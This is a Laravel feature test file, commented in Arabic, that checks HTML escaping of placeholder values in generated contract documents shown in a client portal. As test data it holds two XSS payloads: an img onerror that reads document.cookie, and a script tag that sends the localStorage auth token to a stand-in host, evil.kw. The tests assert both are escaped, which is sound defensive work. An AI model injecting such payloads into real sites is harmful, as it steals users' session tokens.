<?php

declare(strict_types=1);

namespace Tests\Feature;

use App\Models\DocumentTemplate;
use App\Services\DocumentService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * تهريب القيم عند تعبئة قوالب المستندات.
 *
 * المستند المولّد يُعرض كـHTML في **بوابة العميل**، وقيمه تأتي من حقول يملؤها موظف.
 * بلا تهريب كانت قيمة مثل `<img onerror=…>` في حقل «اسم العميل» تُنفَّذ في متصفّح
 * العميل — وتوكنه محفوظ في localStorage.
 */
class DocumentTemplateEscapingTest extends TestCase
{
    use RefreshDatabase;

    private function template(string $body): DocumentTemplate
    {
        return DocumentTemplate::create([
            'name' => 'عقد استشارة',
            'type' => 'contract',
            'body_html' => $body,
            'is_active' => true,
        ]);
    }

    public function test_injected_markup_in_a_placeholder_value_is_escaped(): void
    {
        $template = $this->template('<p>العميل: {{client_name}}</p>');

        $document = app(DocumentService::class)->generate(
            $template,
            null,
            'عقد',
            ['client_name' => '<img src=x onerror="alert(document.cookie)">'],
            null,
        );

        // لا وسم فعلي: القيمة كلّها صارت نصًّا مهرَّبًا داخل الفقرة.
        $this->assertStringNotContainsString('<img', $document->body_html);
        $this->assertStringNotContainsString('onerror="', $document->body_html);
        $this->assertStringContainsString('&lt;img', $document->body_html);
        $this->assertStringContainsString('onerror=&quot;', $document->body_html);
    }

    public function test_script_tag_in_a_value_cannot_close_out_of_context(): void
    {
        $template = $this->template('<p>ملاحظة: {{note}}</p>');

        $document = app(DocumentService::class)->generate(
            $template,
            null,
            'عقد',
            ['note' => '</p><script>fetch("//evil.kw?t="+localStorage.memar_auth)</script>'],
            null,
        );

        $this->assertStringNotContainsString('<script>', $document->body_html);
        $this->assertSame(1, substr_count($document->body_html, '</p>'), 'القيمة كسرت وسم الفقرة');
    }

    public function test_ordinary_arabic_values_still_render_readably(): void
    {
        $template = $this->template('<p>العميل: {{client_name}} — المشروع: {{project}}</p>');

        $document = app(DocumentService::class)->generate(
            $template,
            null,
            'عقد',
            ['client_name' => 'فهد العنزي', 'project' => 'فيلا الشعب'],
            null,
        );

        $this->assertStringContainsString('فهد العنزي', $document->body_html);
        $this->assertStringContainsString('فيلا الشعب', $document->body_html);
    }

    public function test_template_markup_itself_is_preserved(): void
    {
        $template = $this->template('<h1>عقد</h1><table><tr><td>{{amount}}</td></tr></table>');

        $document = app(DocumentService::class)->generate($template, null, 'عقد', ['amount' => '1200'], null);

        $this->assertStringContainsString('<h1>عقد</h1>', $document->body_html);
        $this->assertStringContainsString('<td>1200</td>', $document->body_html);
    }
}
